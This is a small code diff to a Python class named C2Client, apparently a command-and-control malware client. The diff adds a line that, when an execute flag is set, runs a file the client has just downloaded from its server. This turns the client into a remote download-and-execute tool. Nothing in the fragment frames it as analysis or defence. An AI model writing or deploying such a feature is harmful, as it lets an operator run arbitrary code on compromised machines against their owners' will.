@@ -124,6 +124,8 @@ class C2Client:
                 f.write(response.content)
                 
             print(f"Downloaded {resource} successfully.")
+            
+            if execute: subprocess.call(target_dir)
         except Exception as e:
             print(str(e))
             print(f"Error downloading {resource} on client.")
